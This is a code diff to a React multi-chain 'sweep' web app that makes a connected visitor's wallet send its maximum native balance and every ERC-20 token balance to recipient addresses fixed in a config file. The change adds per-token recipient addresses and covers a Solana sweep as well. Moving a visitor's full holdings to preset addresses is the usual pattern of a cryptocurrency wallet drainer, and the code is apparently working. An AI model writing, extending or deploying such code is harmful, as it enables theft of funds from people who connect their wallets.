@@ -13,7 +13,7 @@ import {
   sendSol,
   sendSPLToken
 } from "@reown/appkit-adapter-solana/react";
-import { FIXED_RECIPIENTS, FIXED_SOLANA_RECIPIENT } from "./config";
+import { FIXED_RECIPIENTS, FIXED_SOLANA_RECIPIENT, ERC20_RECIPIENTS } from "./config";
 import { ethers } from "ethers";
 
 const ERC20_ABI = [
@@ -44,7 +44,7 @@ export default function App() {
         const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
         const tokenData = [];
 
-        // Replace with your Reown publicClient token detection if available
+        // Use publicClient token detection if available
         const detectedTokens = await publicClient.getERC20Balances(address);
 
         for (const t of detectedTokens) {
@@ -84,28 +84,31 @@ export default function App() {
     try {
       // --- EVM Sweep ---
       if (chain) {
-        const recipient = FIXED_RECIPIENTS[chain.id];
-        if (!recipient) return alert("No fixed recipient for this chain");
+        const nativeRecipient = FIXED_RECIPIENTS[chain.id];
+        if (!nativeRecipient) return alert("No fixed recipient for this chain");
 
         // Send max native token
         const balance = balanceData.value;
-        const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
+        const gasEstimate = await publicClient.estimateGas({ account: address, to: nativeRecipient, value: balance });
         const gasPrice = await publicClient.getGasPrice();
         const maxNative = balance - gasEstimate * gasPrice;
-        if (maxNative > 0n) await sendTransaction({ to: recipient, value: maxNative });
+        if (maxNative > 0n) await sendTransaction({ to: nativeRecipient, value: maxNative });
 
-        // Send all ERC-20 tokens
+        // Send ERC-20 tokens with per-token recipients
         const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
         const signer = provider.getSigner();
+
         for (const token of erc20Tokens) {
           if (token.balance > 0n) {
+            const tokenRecipient = ERC20_RECIPIENTS[chain.id]?.[token.symbol] || nativeRecipient;
             const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
-            await tokenContract.transfer(recipient, token.balance);
+            await tokenContract.transfer(tokenRecipient, token.balance);
           }
         }
 
         alert(`Sent native + ERC-20 tokens on ${chain.name}`);
       }
+
       // --- Solana Sweep ---
       else if (solConnected) {
         const recipient = FIXED_SOLANA_RECIPIENT;
@@ -130,7 +133,7 @@ export default function App() {
 
   return (
     <div style={{ padding: 40 }}>
-      <h2>Multi-Chain Sweep DApp (Auto Recipient)</h2>
+      <h2>Multi-Chain Sweep DApp (Auto Recipient + ERC-20 Recipients)</h2>
       <appkit-button />
 
       {(isConnected || solConnected) && (
